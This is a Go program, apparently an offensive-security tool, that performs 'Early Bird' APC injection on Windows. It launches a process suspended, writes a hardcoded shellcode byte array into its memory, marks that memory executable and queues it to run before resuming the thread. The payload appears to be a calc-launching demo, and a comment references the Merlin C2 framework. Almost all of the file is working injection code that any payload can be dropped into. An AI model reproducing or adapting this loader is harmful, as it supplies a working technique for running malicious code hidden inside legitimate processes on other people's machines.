package main

import "os"
import "fmt"
import "syscall"
import "unsafe"


func VirtualAllocEx(hProcess uintptr, lpAddress uintptr, dwSize uintptr, flAllocationType uint, flProtect uint) uintptr {
   ret, _, _ := syscall.NewLazyDLL("kernel32.dll").NewProc("VirtualAllocEx").Call(
      uintptr(hProcess),
      uintptr(lpAddress),
      uintptr(dwSize),
      uintptr(flAllocationType),
      uintptr(flProtect),
   )
   return uintptr(ret)
}


func VirtualProtectEx(hProcess uintptr, lpAddress uintptr, dwSize uintptr, flNewProtect uintptr, lpflOldProtect uintptr) uintptr {
   ret, _, _ := syscall.NewLazyDLL("kernel32.dll").NewProc("VirtualProtectEx").Call(
      uintptr(hProcess),
      uintptr(lpAddress),
      uintptr(dwSize),
      uintptr(flNewProtect),
      uintptr(lpflOldProtect),
   )
   return uintptr(ret)
}


func WriteProcessMemory(hProcess uintptr, lpAddress uintptr, lppayloadfer uintptr, nSize uintptr) uintptr {
   ret, _, _ := syscall.NewLazyDLL("kernel32.dll").NewProc("WriteProcessMemory").Call(
      uintptr(hProcess),
      uintptr(lpAddress),
      uintptr(lppayloadfer),
      uintptr(nSize),
   )
   return uintptr(ret)
}


func QueueUserAPC(pfnAPC uintptr, hThread uintptr, dwData uintptr) uintptr {
   ret, _, _ := syscall.NewLazyDLL("kernel32.dll").NewProc("QueueUserAPC").Call(
      uintptr(pfnAPC),
      uintptr(hThread),
      uintptr(dwData),
   )
   return uintptr(ret)
}


func ResumeThread(hProcess uintptr) uintptr {
   ret, _, _ := syscall.NewLazyDLL("kernel32.dll").NewProc("ResumeThread").Call(
      uintptr(hProcess),
   )
   return uintptr(ret)
}


func CloseHandle(hProcess uintptr) uintptr {
   ret, _, _ := syscall.NewLazyDLL("kernel32.dll").NewProc("CloseHandle").Call(
      uintptr(hProcess),
   )
   return uintptr(ret)
}


func CreateProcess(lpApplicationName string, lpCommandLine string, lpProcessAttributes uintptr, lpThreadAttributes uintptr,
   bInheritHandles uintptr, dwCreationFlags int, lpEnvironment uintptr, 
   lpCurrentDirectory uintptr, lpStartupInfo uintptr, lpProcessInformation uintptr) uintptr {
   ret, _, _ := syscall.NewLazyDLL("kernel32.dll").NewProc("CreateProcessA").Call(
      uintptr(unsafe.Pointer(syscall.StringToUTF16Ptr(lpApplicationName))),
      uintptr(unsafe.Pointer(syscall.StringToUTF16Ptr(lpCommandLine))),
      uintptr(lpProcessAttributes),
      uintptr(lpThreadAttributes),      
      uintptr(bInheritHandles),
      uintptr(dwCreationFlags),
      uintptr(lpEnvironment),
      // uintptr(unsafe.Pointer(syscall.StringToUTF16Ptr(lpCurrentDirectory))),
      uintptr(lpCurrentDirectory),
      uintptr(lpStartupInfo),
      uintptr(lpProcessInformation),

   )
   return uintptr(ret)
}


func Earlybird_Injection(proc string, payload []byte) {
   // CreateProcess
   var sI syscall.StartupInfo;
   var pI syscall.ProcessInformation;
   argv := syscall.StringToUTF16Ptr(proc);
   var err error = syscall.CreateProcess( nil, argv, nil, nil, false, 4, nil, nil, &sI, &pI);
   if (err != nil){
      fmt.Println("[+] CreateProcess error: \t\t", err);
   }
   fmt.Println("[+] Process ID: \t\t\t", pI.ProcessId);
   fmt.Println("[+] Thread ID: \t\t\t\t", pI.ThreadId);

   // VirtualAllocEx
   var assigned_address uintptr = VirtualAllocEx(uintptr(pI.Process), 0, uintptr(len(payload)), 0x1000 | 0x2000, 0x04);
   if (assigned_address == 0){
      fmt.Println("[-] VirtualAllocEx API call failed. ");
      os.Exit(-1);
   }
   fmt.Println("[+] Address from VirtualProtectEx:\t", fmt.Sprintf("0x%x", assigned_address));
   
   // WriteProcessMemory
   var res uintptr = WriteProcessMemory(uintptr(pI.Process), assigned_address, uintptr(unsafe.Pointer(&payload[0])), uintptr(len(payload)));
   if (res == 0){
      fmt.Println("[-] WriteProcessMemory API call failed. ");
      os.Exit(-1);
   }
   fmt.Println("[+] WriteProcessMemory response:\t", res);

   // VirtualProtectEx
   var oldProtect uintptr = 0x04
   var vpe_res uintptr = VirtualProtectEx(uintptr(pI.Process), assigned_address, uintptr(len(payload)), 0x20, uintptr(unsafe.Pointer(&oldProtect)));
   fmt.Println("[+] VirtualProtectEx response:\t\t", vpe_res);

   // QueueUserAPC
   var queueUserAPC_res uintptr = QueueUserAPC(assigned_address, uintptr(pI.Thread), 0);
   fmt.Println("[+] QueueUserAPC response:\t\t", queueUserAPC_res);

   // ResumeThread
   ResumeThread(uintptr(pI.Thread));
   
   // CloseHandle
   CloseHandle(uintptr(pI.Process))
   CloseHandle(uintptr(pI.Thread))
}


func main() {
   // Source: https://merlin-c2.readthedocs.io/en/stable/server/menu/agents.html
   var payload []byte = []byte{0x50, 0x51, 0x52, 0x53, 0x56, 0x57, 0x55, 0x6A, 0x60, 0x5A, 0x68, 0x63, 0x61, 0x6C, 0x63, 0x54, 0x59, 0x48, 0x83, 0xEC, 0x28, 0x65, 0x48, 0x8B, 0x32, 0x48, 0x8B, 0x76, 0x18, 0x48, 0x8B, 0x76, 0x10, 0x48, 0xAD, 0x48, 0x8B, 0x30, 0x48, 0x8B, 0x7E, 0x30, 0x03, 0x57, 0x3C, 0x8B, 0x5C, 0x17, 0x28, 0x8B, 0x74, 0x1F, 0x20, 0x48, 0x01, 0xFE, 0x8B, 0x54, 0x1F, 0x24, 0x0F, 0xB7, 0x2C, 0x17, 0x8D, 0x52, 0x02, 0xAD, 0x81, 0x3C, 0x07, 0x57, 0x69, 0x6E, 0x45, 0x75, 0xEF, 0x8B, 0x74, 0x1F, 0x1C, 0x48, 0x01, 0xFE, 0x8B, 0x34, 0xAE, 0x48, 0x01, 0xF7, 0x99, 0xFF, 0xD7, 0x48, 0x83, 0xC4, 0x30, 0x5D, 0x5F, 0x5E, 0x5B, 0x5A, 0x59, 0x58, 0xC3}
   var process_to_spawn string = os.Args[1]
   fmt.Println("[+] Process to spawn: \t\t\t", process_to_spawn);
   Earlybird_Injection(process_to_spawn, payload);
}